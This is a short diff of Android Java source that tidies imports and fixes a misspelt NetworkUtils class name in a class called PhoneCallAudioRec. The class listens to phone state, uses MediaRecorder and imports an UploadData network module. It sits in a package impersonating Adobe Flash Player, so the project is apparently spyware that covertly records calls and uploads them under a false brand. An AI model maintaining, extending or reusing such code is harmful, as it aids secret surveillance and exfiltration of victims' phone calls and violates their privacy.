@@ -4,19 +4,15 @@ import java.io.File;
 import java.io.FileInputStream;
 import android.content.Context;
 import android.media.MediaRecorder;
-import android.os.Looper;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
-import androidx.core.content.ContextCompat;
+
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.network.UploadData;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 
 
 
@@ -111,7 +107,7 @@ public class PhoneCallAudioRec extends PhoneStateListener  {
                                 break;
                             }
 
-                            if (NetworkUitls.isNetworkAvailable(context) == false) {
+                            if (NetworkUtils.isNetworkAvailable(context) == false) {
                                 break;
                             }
 
